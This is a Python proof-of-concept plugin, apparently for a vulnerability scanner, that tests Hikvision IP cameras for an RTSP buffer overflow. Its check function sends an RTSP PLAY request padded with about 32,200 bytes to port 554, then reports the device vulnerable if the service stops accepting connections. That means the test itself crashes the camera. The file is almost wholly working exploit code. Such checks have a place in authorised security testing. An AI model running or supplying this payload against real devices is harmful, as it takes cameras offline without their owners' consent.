import socket
import time

from urllib.parse import urlparse
from lib.data import PocResult


def audit(target_url: str):
    try:
        if check(target_url):
            return PocResult(
                vuln_name="hikvision ipc overflow vulnerable",
                msg="Found Vulnerable",
                poc_name="hikvision_overflow_01",
                vuln_url=target_url,
                status=True
            ).to_dict()
        else:
            return PocResult(
                msg="Not Found Vulnerable",
                poc_name="hikvision_overflow_01",
                vuln_url=target_url,
                status=False
            ).to_dict()
    except Exception as e:
        return PocResult(
            msg=f"Error: {str(e)}",
            poc_name="hikvision_overflow_01",
            vuln_url=target_url,
            status=False
        ).to_dict()


def check(target_url: str):
    host = urlparse(target_url).netloc
    payload = "PLAY rtsp://%s/ RTSP/1.0\r\n" % target_url
    payload += "CSeq: 7\r\n"
    payload += "Authorization: Basic AAAAAAA\r\n"
    payload += "Content-length: 3200\r\n\r\n"
    payload += "A" * 32200

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, 554))
    except socket.error:
        return False
    sock.send(payload.encode())
    sock.close()

    time.sleep(0.2)

    socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        socks.connect((host, 554))
    except socket.error:
        return True
    socks.close()
    return False

